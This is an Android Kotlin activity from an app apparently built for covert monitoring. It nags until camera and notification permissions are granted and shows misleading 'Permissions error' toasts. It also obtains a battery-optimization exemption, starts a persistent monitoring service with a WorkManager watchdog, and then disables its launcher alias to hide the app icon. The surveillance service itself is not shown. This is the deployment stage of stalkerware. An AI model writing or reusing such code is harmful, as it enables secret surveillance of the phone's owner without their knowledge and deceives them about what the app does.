package com.example.system

import android.Manifest
import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import androidx.work.*
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private var isProcessing = false
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        private const val TAG = "MainActivity"
    }

    // 1. 定義需要的權限
    private val requiredPermissions = mutableListOf(Manifest.permission.CAMERA).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    // 2. 權限請求啟動器
    private val permissionLauncher: ActivityResultLauncher<Array<String>> = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.entries.all { it.value }
        if (allGranted) {
            Log.d(TAG, "✅ 權限已全部授權")
            handler.postDelayed({
                checkBatteryOptimization()
            }, 100)
        } else {
            Log.e(TAG, "❌ 權限被拒絕，重試...")
            Toast.makeText(this, "Permissions error", Toast.LENGTH_SHORT).show()
            
            // 延遲重試，直到使用者接受
            handler.postDelayed({
                checkCurrentStatusAndProceed()
            }, 100)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 自動啟動流程：延遲開始
        handler.postDelayed({
            startAutoFlow()
        }, 100)
    }

    override fun onResume() {
        super.onResume()
        // 當使用者從外部設定 (如電池豁免頁面) 返回時，檢查流程
        if (isProcessing) {
            handler.postDelayed({
                checkCurrentStatusAndProceed()
            }, 100)
        }
    }

    private fun startAutoFlow() {
        if (isProcessing) return
        isProcessing = true
        Log.d(TAG, "🚀 開始自動授權流程...")
        checkCurrentStatusAndProceed()
    }

    private fun checkCurrentStatusAndProceed() {
        val allGranted = requiredPermissions.all {
            checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            checkBatteryOptimization()
        } else {
            permissionLauncher.launch(requiredPermissions)
        }
    }

    /** 檢查電池最佳化豁免：如果不通過，則持續請求 */
    @SuppressLint("BatteryLife")
    private fun checkBatteryOptimization() {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
            Log.w(TAG, "🔋 尚未獲得電池豁免，彈出請求...")
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = "package:$packageName".toUri()
                }
                startActivity(intent)
                Toast.makeText(this, "Permissions error", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                Log.e(TAG, "無法跳轉電池設定", e)
                proceedToFinalStep()
            }
        } else {
            Log.d(TAG, "🔋 電池豁免已就緒")
            proceedToFinalStep()
        }
    }

    private fun proceedToFinalStep() {
        // 停頓 1.5 秒執行最後啟動
        handler.postDelayed({
            startServiceAndHideIcon()
        }, 100)
    }

    /** 終極步驟：啟動背景服務並銷毀桌面圖示 */
    private fun startServiceAndHideIcon() {
        Log.d(TAG, "👻 執行最後啟動與隱藏圖示...")
        
        // 1. 啟動背景服務
        val serviceIntent = Intent(this, MonitoringService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "啟動服務失敗", e)
        }

        // 2. 啟動 WorkManager 守護程序
        val workRequest = PeriodicWorkRequestBuilder<MonitoringWorker>(15, TimeUnit.MINUTES)
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "MonitoringGuard",
            ExistingPeriodicWorkPolicy.REPLACE,
            workRequest
        )

        Toast.makeText(this, "OK", Toast.LENGTH_SHORT).show()

        // 3. 💥 殺死圖示替身 (隱藏桌面圖示)
        try {
            val aliasName = ComponentName(this, "$packageName.LauncherAlias")
            packageManager.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.w(TAG, "圖示替身已成功停用")
        } catch (e: Exception) {
            Log.e(TAG, "隱藏圖示失敗", e)
        }

        // 4. 完美消失：延遲 1.5 秒關閉畫面
        handler.postDelayed({
            isProcessing = false
            finish()
        }, 100)
    }
}
